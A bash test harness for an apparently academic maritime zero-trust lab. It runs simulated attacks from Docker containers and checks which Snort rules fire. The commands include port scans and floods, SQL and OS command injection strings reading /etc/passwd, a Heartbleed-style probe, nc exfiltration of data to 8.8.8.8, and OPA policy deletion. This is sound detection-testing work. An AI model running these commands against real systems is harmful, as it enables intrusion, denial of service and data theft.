#!/bin/bash
# =============================================================================
# MARITIME ZTA - COMPLETE SECURITY AUDIT (PURPLE TEAMING)
# Coverage: 8 Categories | 37 Rules | 4 Client Profiles
#
# Execution Path: Project_Maritime_Zero_Trust_Architecture/test/snort/full_audit
# Give execute permissions: chmod +x test_all_zta_rules.sh
# Run it:                   ./test_all_zta_rules.sh
# =============================================================================
export MSYS_NO_PATHCONV=1
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
REPORT_FILE="zta_global_audit_report-2.txt" # "zta_global_audit_report-pre-2.txt"

echo "=======================================================================" > "$REPORT_FILE"
echo " MARITIME ZTA - GLOBAL SECURITY AUDIT REPORT (37 RULES)" >> "$REPORT_FILE"
echo " Execution Start Time: $(date '+%Y-%m-%d %H:%M:%S')" >> "$REPORT_FILE"
echo "=======================================================================" >> "$REPORT_FILE"

header() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} $1${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "\n--- $1 ---" >> "$REPORT_FILE"
}

fire_attack() {
    local source_container=$1
    local attack_desc=$2
    local command=$3
    local expected_sids=$4
    local wait_time=${5:-2}

    local start_time=$(date '+%H:%M:%S')
    echo -e "${YELLOW}► [${start_time}] FROM [${source_container}]:${NC} ${attack_desc}"

    docker exec "$source_container" sh -c "$command" >/dev/null 2>&1 || true
    sleep "$wait_time"

    local end_time=$(date '+%H:%M:%S')

    if docker exec ids_network_monitor sh -c "grep -E -q ':(${expected_sids}):' /var/log/snort/alert_json.txt 2>/dev/null"; then
        echo -e "${GREEN}   [✔] DETECTED at ${end_time} (Intercepted SIDs: $expected_sids)${NC}"
        echo "[✔ DETECTED] $attack_desc (Target SIDs: $expected_sids) - Logged at $end_time" >> "$REPORT_FILE"
    else
        echo -e "${RED}   [✘] MITIGATED/BLIND at ${end_time} (Snort did not see SID $expected_sids)${NC}"
        echo "[✘ MITIGATED/BLOCKED] $attack_desc (Target SIDs: $expected_sids) - Stopped before reaching Snort" >> "$REPORT_FILE"
    fi
}

CERT="--cert /certs/device/device.crt --key /certs/device/device.key"

docker exec ids_network_monitor sh -c "> /var/log/snort/alert_json.txt"
echo -e "${CYAN}Initializing Snort IDS engine buffer and loading audit landscape...${NC}"
sleep 2

# =============================================================================
header "CAT 0: DIAGNOSTIC AND MVP PIPELINE TESTS"
# =============================================================================
fire_attack "client_intruso" "ICMP Ping Intruder Verification" "ping -c 1 -W 2 172.20.13.11" "999901" 4
fire_attack "client_intruso" "Basic TCP SYN Scan Attempt" "nc -zv -w 2 172.20.13.11 80" "999902" 4
fire_attack "client_operatore_ancona" "SQLi application-layer payload via PEP (mTLS authorized)" "curl -k -s --max-time 2 -X POST $CERT https://172.20.13.7:8443/login -d 'user=admin&pass=union select *'" "999903" 4
fire_attack "client_intruso" "Direct connection attempt to MongoDB (Envoy PEP Bypass)" "timeout 2 nc -zv 172.20.3.5 27017" "999904" 4

# =============================================================================
header "CAT 1: RECONNAISSANCE AND DDOS THRESHOLDS"
# =============================================================================
fire_attack "client_intruso" "TCP SYN Port Scan (Volumetric 25-port blast)" "for i in \$(seq 1 25); do nc -zv -w 1 172.20.13.7 \$i & done; wait" "1000001" 3
fire_attack "client_intruso" "UDP Port Scan simulation" "for i in \$(seq 1 25); do nc -zuv -w 1 172.20.13.7 \$i & done; wait" "1000002" 3
fire_attack "client_intruso" "Stealth NULL/FIN/XMAS Flag Scan variant" "timeout 3 nmap -sF 172.20.13.7 || true" "1000003" 2
fire_attack "client_intruso" "DDOS SYN Flood simulation (110 rapid hits)" "for i in \$(seq 1 110); do nc -zv -w 1 172.20.13.7 8443 & done; wait" "1000004" 4
fire_attack "client_intruso" "DDOS Slowloris emulation over HTTP POST" "for i in \$(seq 1 55); do curl -s --max-time 2 -X POST https://172.20.13.7:8443 >/dev/null & done; wait" "1000005" 4

# =============================================================================
header "CAT 2: PEP GATEWAY EVASION (DIRECT SERVICE BYPASS)"
# =============================================================================
fire_attack "client_intruso" "Direct perimeter bypass to db_primary (MongoDB)" "timeout 2 nc -zv 172.20.3.5 27017" "1000006"
fire_attack "client_intruso" "Direct perimeter bypass to api_backend" "timeout 2 nc -zv 172.20.3.20 3000" "1000007"
fire_attack "client_intruso" "Direct perimeter bypass to OPA pdp_engine REST API" "timeout 2 nc -zv 172.20.2.6 8181" "1000008"
fire_attack "client_intruso" "Unauthorized exposure check on Envoy Admin Interface (9901)" "timeout 2 nc -zv 172.20.13.7 9901" "1000009"
fire_attack "client_intruso" "Direct unauthorized access to Splunk SIEM Core" "timeout 2 nc -zv 172.20.4.8 8000" "1000010"

# =============================================================================
header "CAT 3: MTLS CRYPTOGRAPHIC ANOMALIES & POLICY ENFORCEMENT"
# =============================================================================
fire_attack "client_intruso" "Cleartext HTTP GET on enforced mTLS interface" "curl -s --max-time 2 http://172.20.13.7:8443" "1000011"
fire_attack "client_intruso" "Cleartext HTTP POST on enforced mTLS interface" "curl -s --max-time 2 -X POST http://172.20.13.7:8443" "1000012"
fire_attack "client_intruso" "Cryptographic downgrade vector (Enforcing legacy TLS 1.0)" "curl -k -s --max-time 2 --tls-max 1.0 https://172.20.13.7:8443" "1000013"
fire_attack "client_intruso" "TLS Heartbleed malicious memory probing" "echo -ne '\x18\x03\x00\x00\x03\x01\x40\x00' | nc -w 1 172.20.13.7 8443" "1000014"

# =============================================================================
header "CAT 4: L7 DEEP PACKET INSPECTION (DPI APPLICATION INJECTIONS)"
# =============================================================================
fire_attack "client_operatore_ancona" "Insider SQL Injection: UNION SELECT pattern" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?q=union+select'" "1000015|999903"
fire_attack "client_capitano_claudia" "Insider SQL Injection: Destructive DROP TABLE pattern" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?q=drop+table+users'" "1000018"
fire_attack "client_operatore_ancona" "Insider OS Command Injection: Unix pass extraction" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?id=1;cat+/etc/passwd'" "1000019"

# =============================================================================
header "CAT 5: DATA EXFILTRATION DETECTIONS"
# =============================================================================
fire_attack "client_soc_admin" "Exfiltration check: MongoDB Wire Protocol Magic Bytes" "echo -ne '\xd4\x07\x00\x00' | nc -w 1 8.8.8.8 80" "1000020"
fire_attack "client_soc_admin" "Exfiltration check: Volumetric anomalous egress to WAN" "for i in \$(seq 1 550); do echo 'exfil_chunk' | nc -w 1 8.8.8.8 80 >/dev/null 2>&1 & done; wait" "1000021" 4

# =============================================================================
header "CAT 6: EAST-WEST LATERAL MOVEMENT VERIFICATIONS"
# =============================================================================
fire_attack "client_intruso" "Lateral jump check: Public Network -> VPN Segment" "timeout 2 nc -zv 172.20.11.20 80" "1000022"
fire_attack "client_intruso" "Lateral jump check: Public Network -> Satellite Segment" "timeout 2 nc -zv 172.20.12.21 80" "1000023"
fire_attack "client_intruso" "Lateral jump check: Public Network -> Corporate Segment" "timeout 2 nc -zv 172.20.10.20 80" "1000024"
fire_attack "client_intruso" "Lateral jump check: Public Network -> Backend Segment" "timeout 2 nc -zv 172.20.3.5 27017" "1000025"
fire_attack "client_capitano_claudia" "Lateral escalation check: Satellite -> Corporate Network" "timeout 2 nc -zv 172.20.10.20 80" "1000026"
fire_attack "client_capitano_claudia" "Lateral escalation check: Satellite -> Backend Data Layer" "timeout 2 nc -zv 172.20.3.5 27017" "1000027"
fire_attack "client_operatore_ancona" "Lateral evasion check: VPN -> Internal Database directly" "timeout 2 nc -zv 172.20.3.5 27017" "1000028"

# =============================================================================
header "CAT 7: BRUTE FORCE & CREDENTIAL ABUSE"
# =============================================================================
fire_attack "client_intruso" "SSH Brute Force on infrastructure gateway" "for i in \$(seq 1 6); do nc -zv -w 1 172.20.13.7 22 & done; wait" "1000029" 3
fire_attack "client_soc_admin" "SIEM Core Brute Force (Splunk Web/HEC flooding)" "for i in \$(seq 1 12); do curl -s --max-time 2 -X POST http://172.20.2.8:8088 >/dev/null & done; wait" "1000030" 3
fire_attack "client_intruso" "OPA Engine REST API Brute Force attack" "for i in \$(seq 1 16); do curl -s --max-time 2 http://172.20.13.6:8181 >/dev/null & done; wait" "1000031" 3

# =============================================================================
header "CAT 8: CONTROL PLANE TAMPERING & BLINDING VECTORS"
# =============================================================================
fire_attack "client_intruso" "Policy Tampering: OPA PUT /v1/policies (Hot-reload override)" "curl -s --max-time 2 -X PUT http://172.20.13.6:8181/v1/policies" "1000032|1000008"
fire_attack "client_operatore_ancona" "Context Tampering: OPA PUT /v1/data (Decision poisoning)" "curl -s --max-time 2 -X PUT http://172.20.13.6:8181/v1/data" "1000033|1000008"
fire_attack "client_capitano_claudia" "Policy Erasure: OPA DELETE endpoint (Brain wipe)" "curl -s --max-time 2 -X DELETE http://172.20.13.6:8181/v1/policies" "1000034|1000008"
fire_attack "client_soc_admin" "SIEM Blinding: Log Flooding vector on Splunk HEC" "for i in \$(seq 1 220); do curl -s --max-time 2 -X POST http://172.20.2.8:8088 >/dev/null & done; wait" "1000035" 5

# =============================================================================
header "CONSOLIDATION OF SECURITY AUDIT"
# =============================================================================
echo -e "${GREEN}✔ Global audit completed successfully.${NC}"
echo -e "${GREEN}✔ English report written to: ${NC}$(pwd)/${REPORT_FILE}"
echo "=======================================================================" >> "$REPORT_FILE"
echo " END OF REPORT" >> "$REPORT_FILE"

echo -e "\n${YELLOW}► SIEM Pipeline Validation: Check gathered logs at http://localhost:8000${NC}"
echo -e "${CYAN}========================================================================${NC}\n"
